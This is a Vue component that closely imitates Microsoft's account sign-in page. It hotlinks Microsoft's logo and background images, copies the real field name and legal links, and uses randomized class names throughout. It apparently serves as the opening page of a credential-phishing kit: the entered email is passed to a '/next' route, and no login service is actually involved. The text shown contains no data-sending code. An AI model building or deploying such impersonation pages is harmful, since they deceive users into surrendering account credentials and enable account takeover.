<script setup> 
import { ref, onBeforeMount } from 'vue';
import { useRouter  } from 'vue-router';

import ErrorEmail from '@/components/ErrorEmail.vue'
import EmailValidator from '@/components/EmailValidator.vue'

const router = useRouter();
const email = ref('');
const error = ref(false)
const errorEmail = ref(false)

const handleSubmit = () => {
    errorEmail.value = false;
    error.value = false;

    if(!email.value){
        errorEmail.value = true;

    }else{
        errorEmail.value = false; 
        router.push({ path: '/next', query: { email: email.value } });
    }
}; 

const handleKeyup = () => {  
    errorEmail.value = false;
    error.value = false;

    if(!email.value){
        error.value = true;

    }else{
        error.value = false;
    }
};
</script>

<template>
    <div class="block text-gray-700 text-left dir-ltr">
        <div>
            <div id="roo-kzm">
                <div dir="" class="f1w-4r8">
                    <div id="bac-qid" class="f15-ot3 fly-lqv f1l-6fx fk4-9sy fo6-1ni fj9-sbn f1b-evg f19-sq8 f1v-dsr style-cKUbM">
                        <div id="bac-p5n" class="f15-ot3 fly-lqv f1l-6fx fk4-9sy fo6-1ni fj9-sbn f1b-evg f19-sq8 f1v-dsr style-fJJpX">
                        </div>
                    </div>
                    <div class="f1w-eah f1e-o9s f1l-6fx fly-lqv f15-ot3 f1e-fsx f1y-xzt f1v-dsr">
                        <div class="f15-hxf fmr-fxo fmr-fxo-mobile">
                        <div>
                            <div>
                                <div>
                                    <div class="fcg-9vm f1u-dqd f10-zro f17-2om fda-nt3 f1q-7y4 f1q-7y4-mobile fde-e44 fde-e44-mobile f1e-ioj f1e-ioj-mobile f9y-bc9 f9y-bc9-mobile f14-qif fol-78j f1f-o2o f1f-o2o-mobile f1x-4c4 f14-8fj fh2-nbn f1p-qeg f1s-fbp f19-7mj fi2-itw f1l-szm foj-kqr f1y-ra9 f1g-xny f1g-y4o f6f-651">
                                    <div class="fy6-pol fk7-r8w f1b-gnn f1l-6fx fly-lqv f1e-o9s f15-ot3 f1v-dsr f1x-gxe">
                                    </div>
                                    <div>
                                        <img class="f2r-ftl frv-3iw" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
                                        <div class="f10-zro foh-fwc">
                                            <form>
                                            </form> 
                                            <div class="f19-skw f10-zro f6c-fhg f1l-szm fyw-5l2 fvn-w3x f1n-ejc">
                                                <div>
                                                <form @submit.prevent="handleSubmit">
                                                    <div class="ffm-awl fzz-rco fhu-2mo f33-eht info-s6w f1j-jon f1n-dj5 fif-mbm f1o-yig f1a-88d">
                                                        <div>
                                                            Sign in
                                                        </div>
                                                    </div> 

                                                    <ErrorEmail v-if="error"/>
                                                    <EmailValidator v-if="errorEmail"/>

                                                    <div class="f1t-81q f11-w8d f1w-4r8">
                                                        <div>
                                                            <div class="ftg-lv4 fly-lqv fwr-ehg f15-qfo f10-zro fre-s83 f1m-xzs f1t-qw8 f1c-h8d fyf-pd8 f1r-hjc f11-6z2 f4h-5qp fa-o5f f1y-nkp f1x-4nn f16-kke f6r-pt7 f1i-kjn fsp-swo f2x-gww f1i-r48 f1b-w8r f1k-k1l fa-n1z fyw-ct3 f1a-c76 fnp-jnr fsc-f97">
                                                                <input v-model="email" @keyup="handleKeyup" id="log-prj" name="loginfmt" placeholder="Email, phone, or Skype" type="email" class="style-oeqli" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="fed-cme f10-zro f1w-4r8 f16-lzt f12-22n">
                                                        <div class="f1t-81q f11-w8d f1w-4r8">
                                                            <div class="f15-qfo">
                                                            No account? 
                                                            <span class="f11-ac3 f1b-c6v f3r-38p f1e-ziq f1n-zpo f1h-i6x f1d-75y fry-3qy fv6-cxn f1c-7xp f1m-vex f1y-osc f12-ocn f1i-wdi f84-fzv f1n-dj5 fif-mbm f1o-yig f1a-88d">
                                                                <a href="https://signup.live.com/" target="_blank">Create one!</a> 
                                                            </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="f21-5h5 f1y-dol f1x-qc1">
                                                        <div>
                                                            <div class="f1t-81q f11-w8d f1w-4r8">
                                                            <div class="f1e-o9s f1y-xzt f1y-xzt-mobile fly-lqv fes-o6j">
                                                                <div class="f14-yvp">
                                                                    <button  type="submit" class="f1n-1tw f1e-ziq f1n-zpo f1h-i6x f1d-75y fxd-r8a fyt-f7d f14-yvp f10-p19 f11-col f1y-2c3 fjl-wch f10-zro f6d-zh8 f17-13t fz5-thw f1p-qeg f1s-fbp fmr-fxo f1c-s3d f1c-ier f1i-rcn fv6-wlg fns-n4z f84-fzv f9e-ep7 f1b-gag f1y-i23 fqv-yls">
                                                                        Next
                                                                    </button>
                                                                </div>
                                                            </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    </div>
                                    <div class="fcg-9vm f1u-dqd f10-zro fda-nt3 f16-sh9 f17-2om f10-rs3 f14-8fj f1g-g8b f1q-1pw f1c-qh7 fhx-mot f9i-xeo">
                                    <div class="fol-78j f1x-4c4 f1x-4c4-mobile">
                                        <RouterLink to="/options" class="f1k-4kz fly-lqv f1w-eah f14-c8o fp9-xo9 fde-e44 f15-kxw f9y-bc9 f9y-bc9-mobile-btn f3r-38p f1p-iae f1o-jy9 f13-1o9 ffb-39x f9x-var f84-fzv">
                                            <div class="f15-hxf fmr-fxo f10-zro f1s-2ll f1d-brg">
                                                <img class="f10-zro fmr-fxo f1s-2ll f1d-brg" src="https://logincdn.msauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg">
                                            </div>
                                            <div class="f15-hxf fmr-fxo f1o-kex f10-rs3 fjl-wch f11-col f9i-xeo">
                                                Sign-in options 
                                            </div>
                                        </RouterLink>
                                    </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        </div>
                        <div class="f1e-o9s f1v-dsr f1y-xzt fly-lqv f1m-gaq f1y-8q2 f1w-rrz f1h-1lh f1y-qzv">
                        <div class="f1h-tty f11-w8d f19-98f f1t-81q fa-s1j f15-pvo">
                            <RouterLink to="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=21161380f05f43b6aaa240deb0723106" target="_blank" class="fus-idh f1u-85o f33-eht fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh">
                            Terms of use
                            </RouterLink>
                            <RouterLink to="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=21161380f05f43b6aaa240deb0723106" target="_blank" class="fus-idh f1u-85o f33-eht fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh">
                            Privacy &amp; cookies
                            </RouterLink>
                            <RouterLink to="#" class="fus-idh f4y-peb f82-qz7 fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh f1m-w2t f12-hom fhu-2mo f1q-gq5">
                            ...
                            </RouterLink>
                        </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <RouterView />
</template> 


<style scoped>
* { 
    box-sizing: border-box;
} 
 
body { 
    display: none;
} 

body { 
    display: block !important;
} 

body { 
    font-weight: 400; 
    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"; 
    font-size: 0.9375rem; 
    line-height: 1.25rem; 
    margin: 0px; 
    background-color: rgb(255, 255, 255);
} 

/* error message*/
.fti-vg2 { 
    color: rgb(232, 17, 35);
} 

.f1l-ksc { 
    margin-top: 0px;
} 

.fib-bkf { 
    margin-right: 0px;
} 

.f1a-zio { 
    margin-bottom: 0px;
} 

.f9y-9z7 { 
    margin-left: 0px;
} 
/* end of error message*/

#roo-kzm { 
    min-height: 1px;
} 

.f1w-4r8 { 
    min-height: 1px;
} 

.f1l-6fx { 
    height: 100%;
} 

.fly-lqv { 
    width: 100%;
} 

.f15-ot3 { 
    top: 0px;
} 

.f1v-dsr { 
    left: 0px;
} 

.f19-sq8 { 
    position: fixed;
} 

.fk4-9sy { 
    background-size: cover;
} 

.fo6-1ni { 
    background-repeat: no-repeat;
} 

.fj9-sbn { 
    background-position-x: 50%;
} 

.f1b-evg { 
    background-position-y: 50%;
} 

.f1w-eah { 
    display: table;
} 

.f1e-o9s { 
    position: absolute;
} 

.f1e-fsx { 
    right: 0px;
} 

.f1y-xzt { 
    bottom: 0px;
} 

button { 
    font-weight: inherit; 
    font-family: inherit; 
    font-size: inherit; 
    line-height: inherit; 
    max-width: 100%; 
    margin: 0px;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    .f1y-xzt-mobile { 
        bottom: -4px;
    }
}

.f15-hxf { 
    display: table-cell;
} 

.fmr-fxo { 
    vertical-align: middle;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
  .fmr-fxo-mobile { 
        vertical-align: top;
    }
}

.f1m-gaq { 
    overflow-x: visible;
} 

.f1y-8q2 { 
    overflow-y: visible;
} 

.f1w-rrz { 
    z-index: auto;
} 

.f1h-1lh { 
    clear: both;
} 

.f1y-qzv { 
    min-height: 28px;
} 

.f1t-81q { 
    margin-left: 0px;
} 

.f11-w8d { 
    margin-right: 0px;
} 

.f19-98f { 
    margin-bottom: 0px;
} 

.f1h-tty { 
    margin-top: 0px;
} 

.fa-s1j { 
    font-size: 13px;
} 

.f15-pvo { 
    float: right;
} 

@media (max-width: 767px) {
    .f15-pvo { 
        float: left;
    }  
}

a { 
    color: rgb(0, 103, 184); 
    text-decoration: none;
} 

.f14-yvp { 
    display: inline-block;
} 

.fus-idh { 
    color: rgb(0, 0, 0);
} 

.f1u-85o { 
    font-size: 12px;
} 

.f33-eht { 
    line-height: 28px;
} 

.fz5-thw { 
    white-space: nowrap;
} 

.ff9-l3k { 
    margin-left: 8px;
} 

.f1p-156 { 
    margin-right: 8px;
} 

.f1b-c6v { 
    text-decoration: none;
} 

a:hover { 
    text-decoration: underline; 
    color: rgb(102, 102, 102);
} 

.f1m-2vh:hover { 
    color: rgb(0, 0, 0);
} 

.fhu-2mo { 
    font-weight: 600;
} 

.f4y-peb { 
    font-size: 16px;
} 

.f1m-w2t { 
    letter-spacing: 3px;
} 

.f82-qz7 { 
    line-height: 22px;
} 

.f12-hom { 
    vertical-align: top;
} 

.f1q-gq5:hover { 
    text-decoration: none;
} 

.fcg-9vm { 
    margin-left: auto;
} 

.f1u-dqd { 
    margin-right: auto;
} 

.f10-zro { 
    position: relative;
} 

.f17-2om { 
    max-width: 440px;
} 

.fda-nt3 { 
    width: calc(100% - 40px);
} 

.f1q-7y4 { 
    padding-top: 44px;
} 

.fde-e44 { 
    padding-right: 44px;
}  

.f9y-bc9 { 
    padding-left: 44px;
} 

.f1e-ioj { 
    padding-bottom: 44px;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    .fde-e44-mobile { 
        padding-right: 3px;
    } 

    .f1q-7y4-mobile { 
        padding-top: 24px;
    } 
  
    .f9y-bc9-mobile { 
        padding-left: 3px;
    }

    .f9y-bc9-mobile-btn { 
        padding-left: 30px;
    } 

    .f1e-ioj-mobile { 
        padding-bottom: 0px;
    } 
}

.fol-78j { 
    background-color: rgb(255, 255, 255);
} 

.f1f-o2o { 
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
} 

.f1x-4c4 { 
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
} 
 
@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
   
  .f1f-o2o-mobile { 
        box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 0px;
    } 
 
    .f1x-4c4-mobile { 
        border: 1px rgba(0, 0, 0, 0.2) solid ;
        box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 1px;
    }

}



.f14-8fj { 
    min-width: 320px;
} 

.fh2-nbn { 
    min-height: 338px;
} 

.f1p-qeg { 
    overflow-x: hidden;
} 

.f1s-fbp { 
    overflow-y: hidden;
} 

.f19-7mj { 
    z-index: 1;
} 

.f14-qif { 
    margin-bottom: 20px;
} 

.f1l-szm { 
    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
} 

.fi2-itw { 
    transition-timing-function: ease-in;
} 

.foj-kqr { 
    animation-duration: 0.3s;
} 

.f1y-ra9 { 
    animation-name: f11ta6k4;
} 

.f1g-xny { 
    transition-timing-function: ease-in;
} 

.f1g-y4o { 
    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
} 

.f6f-651 { 
    animation-duration: 0.3s;
} 

.f16-sh9 { 
    margin-bottom: 28px;
} 

.f1g-g8b { 
    padding-top: 0px;
} 

.fhx-mot { 
    padding-right: 0px;
} 

.f1c-qh7 { 
    padding-left: 0px;
} 

.f1q-1pw { 
    padding-bottom: 0px;
} 

.f10-rs3 { 
    line-height: 16px;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) xxxxxx*/
    .f14-qif { 
        margin-bottom: 0px;
    }
}

.f9i-xeo { 
    word-break: break-word;
} 

.fy6-pol { 
    background-color: white;
} 

.fk7-r8w { 
    opacity: 0;
} 

.f1b-gnn { 
    z-index: -1;
} 

.f1x-gxe { 
    transition: all 0.5s ease-in 0s;
} 

.f2r-ftl { 
    max-width: 256px;
} 

.frv-3iw { 
    height: 24px;
} /*firststop*/

.foh-fwc { 
    min-height: 206px;
} 

.f3r-38p { 
    background-color: transparent;
} 

.f1p-iae { 
    border-top-width: 0px;
} 

.f1o-jy9 { 
    border-right-width: 0px;
} 

.ffb-39x { 
    border-left-width: 0px;
} 

.f13-1o9 { 
    border-bottom-width: 0px;
} 

.f1k-4kz { 
    cursor: pointer;
} 

.fp9-xo9 { 
    padding-top: 8px;
} 

.f14-c8o { 
    table-layout: fixed;
} 

.f15-kxw { 
    padding-bottom: 8px;
} 

.f84-fzv:hover { 
    cursor: pointer;
} 

.f9x-var:hover { 
    background-color: rgba(0, 0, 0, 0.1);
} 

.f6c-fhg { 
    animation-duration: 0.25s;
} 

.fyw-5l2 { 
    animation-fill-mode: both;
} 

.fvn-w3x { 
    transition-property: left;
} 

.f1n-ejc { 
    animation-name: fr2e2iv;
} 

.f19-skw { 
    min-height: inherit;
} 

.f1s-2ll { 
    width: 32px;
} 

.f1d-brg { 
    height: 32px;
} 

.f1o-kex { 
    text-align: left;
} 

.f11-col { 
    padding-right: 12px;
} 

.fjl-wch { 
    padding-left: 12px;
} 

.info-s6w { 
    margin-top: 16px;
} 

.f1j-jon { 
    margin-bottom: 12px;
} 

.ffm-awl { 
    color: rgb(27, 27, 27);
} 

.fzz-rco { 
    font-size: 1.5rem;
} 

.f1n-dj5 { 
    padding-top: 0px;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    .f1n-dj5 { 
        padding-top: 4px;
    }
}

.fif-mbm { 
    padding-right: 0px;
} 

.f1a-88d { 
    padding-left: 0px;
} 

.f1o-yig { 
    padding-bottom: 0px;
} 

.fed-cme { 
    font-size: 0.8125rem;
} 

.f16-lzt { 
    padding-left: 2px;
} 

.f12-22n { 
    padding-right: 2px;
} 

.f21-5h5 > div:nth-child(1)  { 
    display: inline-block;
} 

.f1y-dol > div:nth-child(1)  { 
    width: 100%;
} 

.f1x-qc1 > div:nth-child(1)  { 
    margin-bottom: 36px;
} 

.f15-qfo { 
    margin-bottom: 16px;
} 

.ftg-lv4 { 
    display: block;
} 

.fwr-ehg { 
    background-image: none;
} 

input { 
    font-weight: inherit; 
    font-family: inherit; 
    font-size: inherit; 
    line-height: inherit; 
    max-width: 100%; 
    margin: 0px;
} 

.fre-s83 input  { 
    height: 36px;
} 

.f1m-xzs input  { 
    width: 100%;
} 

.f1t-qw8 input  { 
    outline-style: none;
} 

.f1c-h8d input  { 
    background-color: transparent;
} 

.fyf-pd8 input  { 
    border-top-style: solid;
} 

.f1r-hjc input  { 
    border-right-style: solid;
} 

.f4h-5qp input  { 
    border-left-style: solid;
} 

.f11-6z2 input  { 
    border-bottom-style: solid;
} 

.fa-o5f input  { 
    border-bottom-right-radius: 0px;
} 

.f1y-nkp input  { 
    border-bottom-left-radius: 0px;
} 

.f1x-4nn input  { 
    border-top-right-radius: 0px;
} 

.f16-kke input  { 
    border-top-left-radius: 0px;
} 

.f6r-pt7 input  { 
    border-top-width: 0px;
} 

.f1i-kjn input  { 
    border-right-width: 0px;
} 

.f2x-gww input  { 
    border-left-width: 0px;
} 

.fsp-swo input  { 
    border-bottom-width: 1px;
} 

.f1i-r48 input  { 
    border-top-color: rgb(102, 102, 102);
} 

.f1b-w8r input  { 
    border-right-color: rgb(102, 102, 102);
} 

.fa-n1z input  { 
    border-left-color: rgb(102, 102, 102);
} 

.f1k-k1l input  { 
    border-bottom-color: rgb(102, 102, 102);
} 

.fyw-ct3 input  { 
    padding-top: 6px;
} 

.f1a-c76 input  { 
    padding-right: 10px;
} 

.fnp-jnr input  { 
    padding-bottom: 6px;
} 

.fsc-f97 input  { 
    padding-left: 0px;
} 

.f11-ac3 { 
    color: rgb(0, 103, 184);
} 

.f1e-ziq { 
    border-top-style: none;
} 

.f1n-zpo { 
    border-right-style: none;
} 

.f1d-75y { 
    border-left-style: none;
} 

.f1h-i6x { 
    border-bottom-style: none;
} 

.fry-3qy:hover { 
    text-decoration: underline;
} 

.fv6-cxn:hover { 
    color: rgb(102, 102, 102);
} 

.f1c-7xp:hover { 
    background-color: transparent;
} 

.f1m-vex:hover { 
    border-top-style: none;
} 

.f1y-osc:hover { 
    border-right-style: none;
} 

.f1i-wdi:hover { 
    border-left-style: none;
} 

.f12-ocn:hover { 
    border-bottom-style: none;
} 

.fes-o6j { 
    text-align: right;
} 

.f17-13t { 
    text-align: center;
} 

.f6d-zh8 { 
    max-width: 100%;
} 

.f1n-1tw { 
    min-height: 32px;
} 

.fxd-r8a { 
    min-width: 108px;
} 

.fyt-f7d { 
    line-height: normal;
} 

.f10-p19 { 
    padding-top: 4px;
} 

.f1y-2c3 { 
    padding-bottom: 4px;
} 

.f1c-s3d { 
    text-overflow: ellipsis;
} 

.f1c-ier { 
    touch-action: manipulation;
} 

.fv6-wlg { 
    background-color: rgb(0, 103, 184);
} 

.f9e-ep7 { 
    border-top-color: rgb(0, 103, 184);
} 

.f1b-gag { 
    border-right-color: rgb(0, 103, 184);
} 

.fqv-yls { 
    border-left-color: rgb(0, 103, 184);
} 

.f1y-i23 { 
    border-bottom-color: rgb(0, 103, 184);
} 

.f1i-rcn { 
    color: rgb(255, 255, 255);
} 

.fns-n4z:hover { 
    background-color: rgb(0, 93, 166);
} 


@keyframes f11ta6k4 { 
  0% {  
      opacity: 0; 
      opacity: 0; 
  }  

} 
@keyframes fr2e2iv { 
  0% {  
      left: 200px; 
      opacity: 0; 
      left: 200px; 
      opacity: 0; 
  }  
  100% {  
      left: 0px; 
      opacity: 1; 
      left: 0px; 
      opacity: 1; 
  }  

} 
 
/* These were inline style tags. Uses id+class to override almost everything */
#bac-qid.style-cKUbM {  
   background-color: rgb(242, 242, 242);  
}  
#bac-p5n.style-fJJpX {  
   background-image: url("https://logincdn.msauth.net/shared/5/js/../images/2_bc3d32a696895f78c19d.svg");  
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    #bac-p5n.style-fJJpX {  
        background-image: none;  
    }

    #bac-qid.style-cKUbM {  
        background-color: white;  
    }

    #log-prj.style-oeqli {  
        border-color:  red;  
    }

}


#log-prj.style-oeqli {  
   border-color: rgb(0, 103, 184);  
} 

@media (max-width: 767px) {
    /* Styles for screens up to 767px wide (typically mobile devices) 
    #log-prj.style-oeqli {  
        border-color: rgb(102, 102, 102);
    }*/
    

}

#sni-w6f.style-KIqY2 {  
   right: 70px;  
    top: 249.5px;  
}  
#style-3jIQA.style-3jIQA {  
   touch-action: none;  
}  
#style-m98yS.style-m98yS {  
   touch-action: none;  
}  
#style-JA5ye.style-JA5ye {  
   top: -2px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-bTpiO.style-bTpiO {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-W6EbM.style-W6EbM {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-xVpLH.style-xVpLH {  
   top: -2px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-L72wK.style-L72wK {  
   top: -2px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-lA2zl.style-lA2zl {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-l2tfl.style-l2tfl {  
   top: 21px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-No4S4.style-No4S4 {  
   top: -2px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-7ddo4.style-7ddo4 {  
   top: 0px;  
    left: 0px;  
    position: absolute;  
}  
#sni-y53.style-LcoKz {  
   left: 1266px;  
    top: 0px;  
} 
</style>